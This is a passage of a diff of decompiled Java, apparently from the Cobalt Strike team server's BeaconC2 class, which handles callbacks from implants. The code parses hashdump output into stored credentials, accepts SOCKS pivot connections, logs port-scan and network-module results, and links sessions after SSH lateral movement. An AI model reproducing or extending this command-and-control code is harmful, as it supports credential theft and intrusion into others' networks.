-                                          var5 = CommonUtils.bString(CommonUtils.readAll(var4));
-                                          if (var5.startsWith("FAIL ")) {
-                                             var5 = CommonUtils.strip(var5, "FAIL ");
-                                             this.getCheckinListener().output(BeaconOutput.Error(var1, "SSH error: " + var5));
-                                             this.getResources().archive(BeaconOutput.Activity(var1, "SSH connection failed."));
-                                          } else if (var5.startsWith("INFO ")) {
-                                             var5 = CommonUtils.strip(var5, "INFO ");
-                                             this.getCheckinListener().output(BeaconOutput.OutputB(var1, "SSH: " + var5));
-                                          } else if (var5.startsWith("SUCCESS ")) {
-                                             var5 = CommonUtils.strip(var5, "SUCCESS ");
-                                             var34 = var5.split(" ")[0];
-                                             var7 = var5.split(" ")[1];
-                                             this.task_to_link(var1, var7);
-                                          } else {
-                                             CommonUtils.print_error("Unknown SSH status: '" + var5 + "'");
-                                          }
-                                       } else {
-                                          CommonUtils.print_error("Unknown Beacon Callback: " + var16);
+                                    for(var8 = 0; var8 < var30.length; ++var8) {
+                                       RegexParser var36 = new RegexParser(var30[var8]);
+                                       if (var36.matches("(.*?):\\d+:.*?:(.*?):::") && !var36.group(1).endsWith("$")) {
+                                          ServerUtils.addCredential(this.resources, var36.group(1), var36.group(2), var20.getComputer(), "hashdump", var20.getInternal());
                                        }
                                     }
+
+                                    this.resources.call("credentials.push");
+                                 } else if (var16 == 22) {
+                                    var18 = var4.readInt();
+                                    var34 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
+                                    var7 = null;
+                                    Integer var35 = new Integer(var18);
+                                    PendingRequest var33;
+                                    synchronized(this) {
+                                       var33 = (PendingRequest)this.pending.remove(var35);
+                                    }
+
+                                    if (var35 < 0) {
+                                       this.process_beacon_callback_default(var35, var1, var34);
+                                    } else if (var33 != null) {
+                                       var33.action(var34);
+                                    } else {
+                                       CommonUtils.print_error("Callback " + var16 + "/" + var18 + " has no pending request");
+                                    }
+                                 } else if (var16 == 23) {
+                                    var18 = var4.readInt();
+                                    var19 = var4.readInt();
+                                    this.socks.accept(var1, var19, var18);
+                                 } else if (var16 == 24) {
+                                    var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
+                                    this.getResources().archive(BeaconOutput.Activity(var1, "received output from net module"));
+                                    this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
+                                    this.runParsers(var5, var1, var16);
+                                 } else if (var16 == 25) {
+                                    var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
+                                    this.getResources().archive(BeaconOutput.Activity(var1, "received output from port scanner"));
+                                    this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
+                                    this.runParsers(var5, var1, var16);
+                                 } else if (var16 == 26) {
+                                    this.getCheckinListener().output(BeaconOutput.Output(var1, CommonUtils.session(var1) + " exit."));
+                                    this.getResources().archive(BeaconOutput.Activity(var1, CommonUtils.session(var1) + " exit."));
+                                    BeaconEntry var38 = this.getCheckinListener().resolve(var1);
+                                    if (var38 != null) {
+                                       var38.die();
+                                    }
+                                 } else if (var16 == 27) {
+                                    var5 = CommonUtils.bString(CommonUtils.readAll(var4));
+                                    if (var5.startsWith("FAIL ")) {
+                                       var5 = CommonUtils.strip(var5, "FAIL ");
+                                       this.getCheckinListener().output(BeaconOutput.Error(var1, "SSH error: " + var5));
+                                       this.getResources().archive(BeaconOutput.Activity(var1, "SSH connection failed."));
+                                    } else if (var5.startsWith("INFO ")) {
+                                       var5 = CommonUtils.strip(var5, "INFO ");
+                                       this.getCheckinListener().output(BeaconOutput.OutputB(var1, "SSH: " + var5));
+                                    } else if (var5.startsWith("SUCCESS ")) {
+                                       var5 = CommonUtils.strip(var5, "SUCCESS ");
+                                       var34 = var5.split(" ")[0];
+                                       var7 = var5.split(" ")[1];
+                                       this.task_to_link(var1, var7);
+                                    } else {
+                                       CommonUtils.print_error("Unknown SSH status: '" + var5 + "'");
+                                    }
+                                 } else {
+                                    CommonUtils.print_error("Unknown Beacon Callback: " + var16);
                                  }
                               }
                            }
                         }
                      }
                   }
-               } catch (IOException var15) {
-                  MudgeSanity.logException("beacon callback: " + var3, var15, false);
                }
-
             }
+         } catch (IOException var27) {
+            MudgeSanity.logException("beacon callback: " + var3, var27, false);
          }
       }
+
    }
 
    public boolean process_beacon_data(String var1, byte[] var2) {
@@ -944,7 +896,6 @@ public class BeaconC2 {
       private _A() {
       }
 
-      // $FF: synthetic method
       _A(Object var2) {
          this();
       }
